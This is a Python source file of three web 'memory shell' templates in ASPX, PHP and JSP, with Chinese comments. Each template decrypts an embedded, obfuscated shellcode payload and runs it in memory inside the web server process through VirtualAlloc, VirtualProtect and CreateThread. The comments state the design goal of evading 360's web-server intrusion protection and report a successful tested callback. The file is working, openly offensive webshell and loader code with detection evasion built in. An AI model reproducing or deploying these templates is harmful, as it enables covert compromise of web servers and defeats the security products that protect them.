#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
templates.py —— 三种内存马模板（ASPX / PHP / JSP）
================================================================================
共同原理：**在站点自身进程内**完成"解密 → 申请 RW 内存 → 写入 → 改 RX → 起线程执行"，
不产生任何新进程、不经过 cmd —— 因此不触发 360「Web 服务器入侵防护」那类
"网站进程派生新进程"的拦截（实测：exe 路线在该规则下 100% 起不来，ASPX 一次上线稳定）。

各语言落地差异（都是"站点进程能否直接调本机 API"）：
  ASPX(.NET)  : 天然在 w3wp 内，P/Invoke 直接调 kernel32        —— 已验证上线
  PHP         : 需 FFI 扩展（PHP>=7.4 且 ffi.enable=1），进程为 php-cgi/php-fpm
  JSP(Java)   : 需 JNA 在 classpath（很多中间件自带），进程为 Tomcat 的 java.exe
密码学：三份模板都用与主工程一致的 Speck64/128-CTR + 位置相关 XOR（载荷密文以 base64/hex 文本嵌入，
        文件里没有明文 shellcode，也没有明文密钥——密钥在运行时由混淆数组反推）。
"""

# ----------------------------------------------------------------- 工具
def cs_bytes(b, name, per=24):
    out = ["        static byte[] %s = new byte[%d] {" % (name, len(b))]
    for o in range(0, len(b), per):
        out.append("            " + ",".join("0x%02X" % x for x in b[o:o + per]) + ",")
    out.append("        };")
    return "\n".join(out)


# ----------------------------------------------------------------- ASPX
ASPAX_TEMPLATE = r'''<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Threading" %>
<script runat="server">
    // 数据变换与执行全部在站点进程内完成：不产生新进程、不调用 cmd
    delegate void Run();

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr a, uint size, uint type, uint protect);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr a, uint size, uint protect, out uint old);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    static string S(params int[] v) { char[] c = new char[v.Length]; for (int i = 0; i < v.Length; i++) c[i] = (char)v[i]; return new string(c); }

__PAYLOAD__

    static uint Ror(uint x, int r) { return (x >> r) | (x << (32 - r)); }
    static uint Rol(uint x, int r) { return (x << r) | (x >> (32 - r)); }

    static uint[] Keys(byte[] k)
    {
        uint[] w = new uint[4];
        for (int i = 0; i < 4; i++) w[i] = (uint)((k[i * 4] << 24) | (k[i * 4 + 1] << 16) | (k[i * 4 + 2] << 8) | k[i * 4 + 3]);
        uint[] rk = new uint[27]; uint[] l = new uint[29];
        rk[0] = w[3]; l[0] = w[2]; l[1] = w[1]; l[2] = w[0];
        for (int i = 0; i < 26; i++) { uint li = (Ror(l[i], 8) + rk[i]) ^ (uint)i; l[i + 3] = li; rk[i + 1] = Rol(rk[i], 3) ^ li; }
        return rk;
    }

    static void Block(uint[] rk, ref uint x, ref uint y)
    {
        for (int i = 0; i < 27; i++) { x = (Ror(x, 8) + y) ^ rk[i]; y = Rol(y, 3) ^ x; }
    }

    static byte[] Decrypt(byte[] enc, byte[] kb, byte[] kx, uint nonce)
    {
        uint[] rk = Keys(kb);
        byte[] pt = new byte[enc.Length];
        int off = 0; uint ctr = 0;
        while (off < enc.Length)
        {
            uint x = nonce, y = ctr++;
            Block(rk, ref x, ref y);
            byte[] ks = new byte[] { (byte)(x >> 24), (byte)(x >> 16), (byte)(x >> 8), (byte)x,
                                     (byte)(y >> 24), (byte)(y >> 16), (byte)(y >> 8), (byte)y };
            for (int i = 0; i < 8 && off < enc.Length; i++) { pt[off] = (byte)(enc[off] ^ ks[i]); off++; }
        }
        for (int i = 0; i < pt.Length; i++) pt[i] = (byte)(pt[i] ^ kx[i % 32] ^ (byte)((i * 7 + 0x5A) & 0xFF));
        return pt;
    }

    void Page_Load(object sender, EventArgs e)
    {
        byte[] pt = Decrypt(ENC, KeyB(KBO), KeyX(KXO), NONCE);
        IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)pt.Length, 0x3000, 0x04);
        if (m == IntPtr.Zero) { Response.Write("e1"); return; }
        Marshal.Copy(pt, 0, m, pt.Length);
        uint old;
        VirtualProtect(m, (uint)pt.Length, 0x20, out old);
        IntPtr k32 = LoadLibraryA(S(107,101,114,110,101,108,51,50,46,100,108,108));
        IntPtr ct = GetProcAddress(k32, S(67,114,101,97,116,101,84,104,114,101,97,100));
        if (ct == IntPtr.Zero) { Response.Write("e2"); return; }
        Ct d = (Ct)Marshal.GetDelegateForFunctionPointer(ct, typeof(Ct));
        IntPtr th; uint tid;
        d(IntPtr.Zero, 0, m, IntPtr.Zero, 0, out tid, out th);
        Response.Write("ok");
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr Ct(IntPtr sa, uint stack, IntPtr start, IntPtr param, uint flags, out uint id, out IntPtr h);
</script>
<html><head><title>Service</title></head><body>OK</body></html>
'''

ASPAX_BLOCK = """        static byte[] ENC = new byte[{n_enc}] {{ ... }};
        static byte[] KXO = ..., KBO = ..., MSK = ...;
        static uint NONCE = ...;
        static byte[] KeyX(byte[] o) {{ ... }}
        static byte[] KeyB(byte[] o) {{ ... }}"""


# ----------------------------------------------------------------- PHP
PHP_TEMPLATE = r'''<?php
/* 内存马：在站点进程（php-cgi / php-fpm）内解密并执行，不产生新进程、不经 cmd。
   前置条件：PHP >= 7.4 且 ffi.enable=1（探测：访问本文件，页面会打印自检结果）。 */
header('Content-Type: text/plain');
if (!class_exists('FFI')) { echo "no-ffi"; exit; }

$_enc = base64_decode('__ENC__');
$_kxo = base64_decode('__KXO__');
$_kbo = base64_decode('__KBO__');
$_msk = base64_decode('__MSK__');
$_nx  = __NONCE__;
$_ax  = __AX__;
$_ar  = __AR__;

function _kx($o) { global $_msk, $_ax; $r = ''; $n = strlen($o);
  for ($i = 0; $i < $n; $i++) { $r .= chr((ord($o[$i]) ^ ord($_msk[($i + $_ax) % 8]) ^ (($i * 0x1D) & 0xFF)) & 0xFF); } return $r; }
function _kb($o) { global $_msk, $_ar; $r = ''; $n = strlen($o);
  for ($i = 0; $i < $n; $i++) { $r .= chr((ord($o[$i]) ^ ord($_msk[($i + $_ar) % 8]) ^ (($i * 0x2B) & 0xFF)) & 0xFF); } return $r; }

function _ror($x, $r) { return (($x >> $r) | ($x << (32 - $r))) & 0xFFFFFFFF; }
function _rol($x, $r) { return (($x << $r) | ($x >> (32 - $r))) & 0xFFFFFFFF; }

function _keys($k) {
  $w = array_values(unpack('N4', $k));
  $rk = array($w[3]); $l = array($w[2], $w[1], $w[0]);
  for ($i = 0; $i < 26; $i++) {
    $li = ((_ror($l[$i], 8) + $rk[$i]) & 0xFFFFFFFF) ^ $i;
    $l[] = $li; $rk[] = _rol($rk[$i], 3) ^ $li;
  }
  return $rk;
}
function _blk($rk, $x, $y) {
  for ($i = 0; $i < 27; $i++) { $x = ((_ror($x, 8) + $y) & 0xFFFFFFFF) ^ $rk[$i]; $y = _rol($y, 3) ^ $x; }
  return array($x, $y);
}
function _dec($enc, $kb, $kx, $nx) {
  $rk = _keys($kb); $len = strlen($enc); $pt = ''; $off = 0; $ctr = 0;
  while ($off < $len) {
    list($x, $y) = _blk($rk, $nx, $ctr++);
    $ks = chr(($x >> 24) & 0xFF) . chr(($x >> 16) & 0xFF) . chr(($x >> 8) & 0xFF) . chr($x & 0xFF)
        . chr(($y >> 24) & 0xFF) . chr(($y >> 16) & 0xFF) . chr(($y >> 8) & 0xFF) . chr($y & 0xFF);
    for ($i = 0; $i < 8 && $off < $len; $i++, $off++) { $pt .= chr(ord($enc[$off]) ^ ord($ks[$i])); }
  }
  $out = '';
  for ($i = 0; $i < $len; $i++) { $out .= chr((ord($pt[$i]) ^ ord($kx[$i % 32]) ^ (($i * 7 + 0x5A) & 0xFF)) & 0xFF); }
  return $out;
}

$sc = _dec($_enc, _kb($_kbo), _kx($_kxo), $_nx);
if (strlen($sc) < 64) { echo "decrypt-fail"; exit; }

$f = FFI::cdef("
  void* VirtualAlloc(void* a, size_t s, unsigned long t, unsigned long p);
  int   VirtualProtect(void* a, size_t s, unsigned long p, unsigned long* o);
  void* CreateThread(void* sa, size_t st, void* start, void* param, unsigned long fl, unsigned long* id);
", "kernel32.dll");

$mem = $f->VirtualAlloc(null, strlen($sc), 0x3000, 0x04);   // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
if (!$mem) { echo "e1"; exit; }
FFI::memcpy($f->cast("unsigned char*", $mem), $sc, strlen($sc));
$old = $f->new("unsigned long");
$f->VirtualProtect($mem, strlen($sc), 0x20, FFI::addr($old));  // -> PAGE_EXECUTE_READ
$tid = $f->new("unsigned long");
$f->CreateThread(null, 0, $mem, null, 0, FFI::addr($tid));
echo "ok";
'''


# ----------------------------------------------------------------- JSP
JSP_TEMPLATE = r'''<%@ page language="java" import="java.util.*,com.sun.jna.*" pageEncoding="UTF-8" %>
<%--
  内存马：在站点进程（Tomcat 的 java.exe）内解密并执行，不产生新进程、不经 cmd。
  前置条件：classpath 里有 JNA（com.sun.jna）。没有的话页面会打印 no-jna。
--%>
<%!
  static int ror(int x, int r) { return (x >>> r) | (x << (32 - r)); }
  static int rol(int x, int r) { return (x << r) | (x >>> (32 - r)); }

  static int[] keys(byte[] k) {
      int[] w = new int[4];
      for (int i = 0; i < 4; i++)
          w[i] = ((k[i*4] & 0xff) << 24) | ((k[i*4+1] & 0xff) << 16) | ((k[i*4+2] & 0xff) << 8) | (k[i*4+3] & 0xff);
      int[] rk = new int[27], l = new int[29];
      rk[0] = w[3]; l[0] = w[2]; l[1] = w[1]; l[2] = w[0];
      for (int i = 0; i < 26; i++) { int li = (ror(l[i], 8) + rk[i]) ^ i; l[i+3] = li; rk[i+1] = rol(rk[i], 3) ^ li; }
      return rk;
  }

  static byte[] hex2bin(String s) {
      byte[] o = new byte[s.length() / 2];
      for (int i = 0; i < o.length; i++) o[i] = (byte) Integer.parseInt(s.substring(i*2, i*2+2), 16);
      return o;
  }

  static byte[] decrypt(byte[] enc, byte[] kb, byte[] kx, long nonce) {
      int[] rk = keys(kb);
      byte[] pt = new byte[enc.length];
      int off = 0; long ctr = 0;
      while (off < enc.length) {
          int x = (int) nonce, y = (int) ctr++;
          for (int i = 0; i < 27; i++) { x = (ror(x, 8) + y) ^ rk[i]; y = rol(y, 3) ^ x; }
          byte[] ks = new byte[] { (byte)(x >>> 24), (byte)(x >>> 16), (byte)(x >>> 8), (byte)x,
                                   (byte)(y >>> 24), (byte)(y >>> 16), (byte)(y >>> 8), (byte)y };
          for (int i = 0; i < 8 && off < enc.length; i++) { pt[off] = (byte)(enc[off] ^ ks[i]); off++; }
      }
      for (int i = 0; i < pt.length; i++) pt[i] = (byte)(pt[i] ^ kx[i % 32] ^ (byte)((i * 7 + 0x5A) & 0xFF));
      return pt;
  }
%>
<%
  response.setContentType("text/plain");
  String encHex = "__ENC__";
  byte[] enc = hex2bin(encHex);
  // 密钥反推（与主工程一致）
  byte[] msk = hex2bin("__MSK__");
  byte[] kxo = hex2bin("__KXO__"), kbo = hex2bin("__KBO__");
  int AX = __AX__, AR = __AR__;
  byte[] rkx = new byte[kxo.length], rkb = new byte[kbo.length];
  for (int i = 0; i < kxo.length; i++) rkx[i] = (byte)(kxo[i] ^ msk[(i + AX) % 8] ^ (byte)((i * 0x1D) & 0xFF));
  for (int i = 0; i < kbo.length; i++) rkb[i] = (byte)(kbo[i] ^ msk[(i + AR) % 8] ^ (byte)((i * 0x2B) & 0xFF));
  long nonce = __NONCE__L;
  byte[] sc = decrypt(enc, rkb, rkx, nonce);
  if (sc.length < 64) { out.print("decrypt-fail"); return; }

  try {
      NativeLibrary k32 = NativeLibrary.getInstance("kernel32");
      Function va = k32.getFunction("VirtualAlloc");
      Function vp = k32.getFunction("VirtualProtect");
      Function ct = k32.getFunction("CreateThread");
      IntByReference oldp = new IntByReference(), tid = new IntByReference();
      Pointer mem = va.invokePointer(new Object[]{ null, sc.length, 0x3000, 0x04 });
      if (mem == null) { out.print("e1"); return; }
      mem.write(0, sc, 0, sc.length);
      vp.invokeInt(new Object[]{ mem, sc.length, 0x20, oldp });
      ct.invokePointer(new Object[]{ null, 0, mem, null, 0, tid });
      out.print("ok");
  } catch (Throwable t) {
      out.print("no-jna: " + t.getClass().getName());
  }
%>
'''
